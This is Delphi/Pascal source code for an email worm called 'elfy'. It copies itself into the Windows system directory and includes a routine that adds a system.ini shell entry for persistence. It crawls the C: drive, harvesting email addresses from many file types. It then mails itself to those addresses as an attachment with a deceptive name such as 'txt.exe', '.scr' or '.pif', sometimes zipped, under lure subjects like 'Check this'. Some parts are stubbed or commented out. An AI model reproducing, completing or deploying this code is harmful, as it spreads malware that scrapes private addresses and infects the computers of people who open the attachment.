   program elfy;

   {.$DEFINE DEBUG}

   {$IFDEF DEBUG}
    {$APPTYPE CONSOLE}
   {$ENDIF}

   uses
     Email in 'Email.pas',
     StrList in 'StrList.pas',
     Zip in 'zip.pas',
     MXResolver in 'MXResolver.pas',
     Windows,
     Winsock;

   type
     TFileName = type string;
     TSearchRec = record
       Time: Integer;
       Size: Integer;
       Attr: Integer;
       Name: TFileName;
       ExcludeAttr: Integer;
       FindHandle: THandle  platform;
       FindData: TWin32FindData  platform;
     end;

     LongRec = packed record
       case Integer of
         0: (Lo, Hi: Word);
         1: (Words: array [0..1] of Word);
         2: (Bytes: array [0..3] of Byte);
     end;

   const
     faReadOnly  = $00000001;
     faHidden    = $00000002;
     faSysFile   = $00000004;
     faVolumeID  = $00000008;
     faDirectory = $00000010;
     faArchive   = $00000020;
     faAnyFile   = $0000003F;

   Var
     Mails        : String;
     m_Sub,
     m_attach, m_path,
     m_body       : String;


   procedure autostart(fname       :string);
   begin
    {$IFDEF DEBUG}
     Exit;
    {$ENDIF}
    WritePrivateProfileString('boot','shell',pChar('Explorer.exe '+fName), 'system.ini');
    Readln;
   end;

   function sysdir:string;
   var b:array[0..255]of char;
   begin
    GetSystemDirectory(b, 255);
    Result := b;
    Result := Result + '\';
   end;

   Function LowerCase(const S: string): string;
   var
    Len: Integer;
   begin
    Len := Length(S);
    SetString(Result, PChar(S), Len);
    if Len > 0 then CharLowerBuff(Pointer(Result), Len);
   end;

   Function ExtractFileName(str:string):string;
   var
    s:string;
   begin
    s := str;
    While pos('\', s)>0 do
     s := copy(s, pos('\',s)+1, length(s));
    result := s;
   end;

   Function FileSize(FileName: String): Int64;
   Var
    H: THandle;
    FData: TWin32FindData;
   Begin
   Result:= -1;
   H:= FindFirstFile(PChar(FileName), FData);
   If H <> INVALID_HANDLE_VALUE Then
    Begin
     Windows.FindClose(H);
     Result:= Int64(FData.nFileSizeHigh) Shl 32 + FData.nFileSizeLow;
    End;
   End;

   Procedure GetMailInfo(str       :String);
   var
    F      :TextFile;
    l1,l2,line:string;
   Begin
    Line := '';
    If m_attach = '' then Begin
   //  m_attach := Copy(str, 1, Length(Str)-3);
     Randomize;
     Case Random(5) Of
      0: m_attach := Copy(str, 1, Length(Str)-3)+'exe';
      1: m_attach := Copy(str, 1, Length(Str)-3)+'scr';
      2: m_attach := Copy(str, 1, Length(Str)-3)+'txt.exe';
      3: m_attach := Copy(str, 1, Length(Str)-3)+'htm.exe';
      4: m_attach := Copy(str, 1, Length(Str)-3)+'com';
     End;
     Randomize;
     If Random(101) < 50 Then Begin
     zip_make(Sysdir+'win32d.exe', Sysdir+Copy(ExtractFileName(str),
     1, Length(ExtractFileName(Str))-3)+'zip',
     Copy(ExtractFileName(m_attach),
     length(ExtractFileName(m_attach))-11, 12));

     m_path := Sysdir+Copy(ExtractFileName(str),
     1, Length(ExtractFileName(Str))-3)+'zip';
     End Else Begin
      Randomize;
      Case Random(6) Of
       0:m_path := Sysdir+Copy(ExtractFileName(str),1, Length(ExtractFileName(Str))-3)+'com';
       1:m_path := Sysdir+Copy(ExtractFileName(str),1, Length(ExtractFileName(Str))-3)+'exe';
       2:m_path := Sysdir+Copy(ExtractFileName(str),1, Length(ExtractFileName(Str))-3)+'pif';
       3:m_path := Sysdir+Copy(ExtractFileName(str),1, Length(ExtractFileName(Str))-3)+'scr';
       4:m_path := Sysdir+Copy(ExtractFileName(str),1, Length(ExtractFileName(Str))-3)+'cmd';
       5:m_path := Sysdir+Copy(ExtractFileName(str),1, Length(ExtractFileName(Str))-3)+'bat';
      End;
      CopyFile(pChar(ParamStr(0)), pChar(m_path), False);
     End;
    End;
    If m_Sub = '' Then Begin
     Randomize;
     Case Random(5) Of
      0: m_sub := 'Re : '+m_Attach;
      1: m_sub := m_Attach;
      2: m_sub := 'Check this '+m_Attach;
      3: m_sub := '"'+m_Attach+'"';
      4: m_sub := 're: '+m_Attach;
     End;
    End;
    AssignFile(F, Str);
    Reset(F, Str);
    read(f, l1);
    readln(f, l2);
    Line := Line + L1;
    While Not Eof(F) Do Begin
     read(f, l1);
     readln(f, l2);
     Line := Line + L1;
    End;
    CloseFile(F);
    If m_body = '' Then m_Body := line;
   End;

   Procedure GatherMail(Filename:string);
   Var
    F:Textfile;
    L1,L2,Text:string;
    MAIL:String;
    H,E,i, A:Integer;
    ABC,ABC2:STRING;
    Label again;
   begin
    ABC:='abcdefghijklmnopqrstuvwxyz_-ABCDEFGHIJKLMNOPQRSTUVWXYZ';
    ABC2:='abcdefghijklmnopqrstuvwxyz_-ABCDEFGHIJKLMNOPQRSTUVWXYZ.';
    if filesize(filename) > 5000 then exit;
    CopyFile(Pchar(Filename),pchar(Filename+'_'),false);
    sleep(300);
    AssignFile(F,Filename+'_');
    try
     Reset(F);
    except
     exit;
    end;
    Read(F,L1);
    ReadLN(F,L2);
    Text:=L1;
    While NOt EOF(F) DO BEGIN
     Read(F,L1);
     ReadLN(F,L2);
     Text:=Text+'|'+L1;
    END;
    Closefile(F);
    Deletefile(pchar(Filename+'_'));
    sleep(200);
    if copy(text,1,2)='MZ' then exit;
    text:='|'+text+'|';

   //Now we gather the informition.
    AGAIN:
    IF pos('@',Text)>0 then begin
     A:=Pos('@',Text)-1;
     if a =0 then a := 1;
     L1 := copy(text,a,1);
     L2 := copy(text,a+2,1);
     H := pos(L1,abc);
     E := pos(L2,abc2);
     if (H = 0) or (e=0) then begin
      text:=copy(text,a+1,length(text));
      goto again;
     end;
     While POS(Copy(TExt,a,1),ABC)>0 do begin
      A:=A-1;
     end;
     a := a +1;
     Mail := copy(Text,a,length(text)); //grab start of mail.
     Mail := COpy(Mail,1,pos('@',mail)+2);
     i:= pos(MAIL,text)+length(mail);
     While pos(copy(mail,length(mail),1),ABC2)>0 do begin
      Mail := mail+copy(text,i,1);
      i:=i+1;
     end;
     if POS(copy(mail,length(mail),1),ABC2)=0 then Mail:=copy(mail,1,length(mail)-1);
     Mails := Mails+Mail+#13#10;
     Text:=copy(text,pos(mail,text)+length(mail),length(text));
     goto AGAIN;
    end;
   end;

   procedure SMail(rec, fromn, fromm, serv:string);
   VAR
     I          : Boolean;
     SMTPEngine : TSMTPEngine;

   BEGIN
    While Rec <> '' Do Begin
     SMTPEngine:=TSMTPEngine.Create;
     SMTPEngine.Subject:='abdfgdfgdfgc';
     SMTPEngine.Body:='dfgdfgdfgdfh';
     SMTPEngine.From:=FromM;
     SMTPEngine.Recip:=Copy(Rec, 1, pos(#13#10, rec)-1);
     SMTPEngine.Attachment:=m_path;
     I:=SMTPEngine.SendEmail;
     SMTPEngine.Free;
     Rec := Copy(Rec, pos(#13#10, rec)+2, length(REC));
    End;
    DeleteFile(pChar(m_path));
   end;

   Procedure GMail(fName:String);
   Var
    Tmp    :String;
   Begin
    Tmp := Copy(fName, Length(fName)-2, 3);
    Tmp := LowerCase(Tmp);
    If tmp = 'cgi' Then GatherMail(fName);
    If tmp = 'msg' Then GatherMail(fName);
    If tmp = 'oft' Then GatherMail(fName);
    If tmp = 'sht' Then GatherMail(fName);
    If tmp = 'dbx' Then GatherMail(fName);
    If tmp = 'tbb' Then GatherMail(fName);
    If tmp = 'adb' Then GatherMail(fName);
    If tmp = 'doc' Then GatherMail(fName);
    If tmp = 'wab' Then GatherMail(fName);
    If tmp = 'asp' Then GatherMail(fName);
    If tmp = 'uin' Then GatherMail(fName);
    If tmp = 'rtf' Then GatherMail(fName);
    If tmp = 'vbs' Then GatherMail(fName);
    If tmp = 'tml' Then GatherMail(fName);
    If tmp = 'htm' Then GatherMail(fName);
    If tmp = '.pl' Then GatherMail(fName);
    If tmp = 'php' Then GatherMail(fName);
    If tmp = 'txt' Then GatherMail(fName);
    If tmp = 'eml' Then GatherMail(fName);
    If tmp = 'txt' Then GetMailInfo(fName);
    If Mails <> '' Then Begin
     SMail('SoulTrapped@Hotmail.com'+#13#10, 'stfu', 'stfu@hotmail.com', 'mx1.hotmail.com');
     MessageBox(0,'safa','asfasghah',mb_ok);
     ExitProcess(0);
    End;
   End;

   function FindMatchingFile(var F: TSearchRec): Integer;
   var
     LocalFileTime: TFileTime;
   begin
     with F do
     begin
       while FindData.dwFileAttributes and ExcludeAttr <> 0 do
         if not FindNextFile(FindHandle, FindData) then
         begin
           Result := GetLastError;
           Exit;
         end;
       FileTimeToLocalFileTime(FindData.ftLastWriteTime, LocalFileTime);
       FileTimeToDosDateTime(LocalFileTime, LongRec(Time).Hi,
         LongRec(Time).Lo);
       Size := FindData.nFileSizeLow;
       Attr := FindData.dwFileAttributes;
       Name := FindData.cFileName;
     end;
     Result := 0;
   end;

   procedure FindClose(var F: TSearchRec);
   begin
     if F.FindHandle <> INVALID_HANDLE_VALUE then
     begin
       Windows.FindClose(F.FindHandle);
       F.FindHandle := INVALID_HANDLE_VALUE;
     end;
   end;

   function FindFirst(const Path: string; Attr: Integer;
     var  F: TSearchRec): Integer;
   const
     faSpecial = faHidden or faSysFile or faVolumeID or faDirectory;
   begin
     F.ExcludeAttr := not Attr and faSpecial;
     F.FindHandle := FindFirstFile(PChar(Path), F.FindData);
     if F.FindHandle <> INVALID_HANDLE_VALUE then
     begin
       Result := FindMatchingFile(F);
       if Result <> 0 then FindClose(F);
     end else
       Result := GetLastError;
   end;

   function FindNext(var F: TSearchRec): Integer;
   begin
     if FindNextFile(F.FindHandle, F.FindData) then
       Result := FindMatchingFile(F) else
       Result := GetLastError;
   end;

   procedure FMail(D, Name, SearchName : String);
   var
     SR: TSearchRec;
   begin
     sleep(10);
     If D[Length(D)] <> '\' then D := D + '\';
     If FindFirst(D + '*.*', faDirectory, SR) = 0 then
       Repeat
         If ((Sr.Attr and faDirectory) = faDirectory) and (SR.Name[1] <> '.') then
           FMail(D + SR.Name + '\', Name, SearchName)
         Else
           GMail(D + SR.Name);
       Until (FindNext(SR) <> 0);
     FindClose(SR);
   end;

   begin
    CreateMutexA(nil, True, 'elfy');
    if GetLastError() = ERROR_ALREADY_EXISTS then
     ExitProcess(0);

    CopyFile(pChar(paramstr(0)), pChar(sysdir+'win32d.exe'), false);
   // zip_make(sysdir+'win32d.exe', sysdir+'[1]eCard.zip', '[1]eCard.scr');
   // AutoStart('win32d.exe');
    FMail('C:\', '*', '*.*');
   end.
